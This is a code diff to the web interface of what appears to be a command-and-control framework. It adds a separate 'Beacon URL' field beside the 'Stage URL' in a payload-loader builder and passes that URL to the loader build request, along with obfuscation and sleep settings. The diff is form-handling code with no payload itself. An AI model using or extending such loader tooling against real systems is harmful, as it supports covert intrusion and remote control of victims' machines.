@@ -1453,12 +1453,21 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
                   </div>
                 </div>
 
-                <!-- C2 URL -->
+                <!-- Stage URL -->
                 <div class="form-row" style="margin:0">
-                  <label style="margin-bottom:4px">C2 URL <span style="font-weight:400;color:var(--text3)">(where the agent beacons and the stage is hosted)</span></label>
+                  <label style="margin-bottom:4px">Stage URL <span style="font-weight:400;color:var(--text3)">(where the encrypted payload is hosted and downloaded from)</span></label>
                   <div style="display:flex;gap:6px">
-                    <input id="ldr-url" placeholder="http://10.0.0.1:8080" style="flex:1" oninput="ldrUpdatePreview()">
+                    <input id="ldr-url" placeholder="http://10.0.0.1:8080" style="flex:1" oninput="ldrUpdatePreview(); ldrSyncBeacon()">
                     <button class="btn btn-ghost btn-sm" onclick="ldrFillURL()" title="Fill from active tunnel">↙</button>
+                  </div>
+                </div>
+
+                <!-- Beacon URL -->
+                <div class="form-row" style="margin:0">
+                  <label style="margin-bottom:4px">Beacon URL <span style="font-weight:400;color:var(--text3)">(where the agent beacons — leave blank to use Stage URL)</span></label>
+                  <div style="display:flex;gap:6px">
+                    <input id="ldr-beacon-url" placeholder="same as Stage URL" style="flex:1;color:var(--text2)" oninput="ldrBeaconEdited()">
+                    <button class="btn btn-ghost btn-sm" onclick="ldrClearBeacon()" title="Reset to Stage URL" id="ldr-beacon-clear" style="display:none">✕</button>
                   </div>
                 </div>
 
@@ -14039,6 +14048,8 @@ function ldrUpdatePreview() {
   }
 }
 
+let _ldrBeaconManual = false;
+
 function ldrFillURL() {
   const tunnelURL = document.getElementById('stager-tunnel-url')?.textContent?.trim() ||
                     stagerState?.public_url ||
@@ -14046,6 +14057,7 @@ function ldrFillURL() {
   if (tunnelURL && /^https?:\/\//i.test(tunnelURL)) {
     const el = document.getElementById('ldr-url');
     if (el) { el.value = tunnelURL.replace(/\/+$/, ''); ldrUpdatePreview(); }
+    if (!_ldrBeaconManual) document.getElementById('ldr-beacon-url').value = '';
     return;
   }
   const h = document.getElementById('pay-host')?.value?.trim() || '';
@@ -14056,14 +14068,35 @@ function ldrFillURL() {
     const el = document.getElementById('ldr-url');
     const host = h.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
     if (el) { el.value = `${scheme}://${host}:${port}`; ldrUpdatePreview(); }
+    if (!_ldrBeaconManual) document.getElementById('ldr-beacon-url').value = '';
   } else {
     toast('No active tunnel or host configured', 'red');
   }
 }
 
+function ldrSyncBeacon() {
+  if (!_ldrBeaconManual) document.getElementById('ldr-beacon-url').value = '';
+}
+
+function ldrBeaconEdited() {
+  const val = (document.getElementById('ldr-beacon-url').value || '').trim();
+  _ldrBeaconManual = val !== '';
+  const btn = document.getElementById('ldr-beacon-clear');
+  if (btn) btn.style.display = _ldrBeaconManual ? '' : 'none';
+}
+
+function ldrClearBeacon() {
+  _ldrBeaconManual = false;
+  document.getElementById('ldr-beacon-url').value = '';
+  const btn = document.getElementById('ldr-beacon-clear');
+  if (btn) btn.style.display = 'none';
+}
+
 async function buildLoader() {
-  const stageURL = (document.getElementById('ldr-url').value || '').trim();
-  if (!stageURL) { toast('C2 HTTP URL required', 'red'); return; }
+  const stageURL  = (document.getElementById('ldr-url').value || '').trim();
+  if (!stageURL) { toast('Stage URL required', 'red'); return; }
+  const beaconRaw = (document.getElementById('ldr-beacon-url').value || '').trim();
+  const beaconURL = beaconRaw || stageURL;
 
   const loaderFmt = document.getElementById('ldr-type').value;
   const garble    = document.getElementById('ldr-garble').checked;
@@ -14086,7 +14119,7 @@ async function buildLoader() {
   const body = {
     format:           loaderFmt,
     stage_url:        stageURL,
-    server_url:       stageURL,
+    server_url:       beaconURL,
     lang:             lang,
     transport:        transport,
     sleep_sec:        sleep,
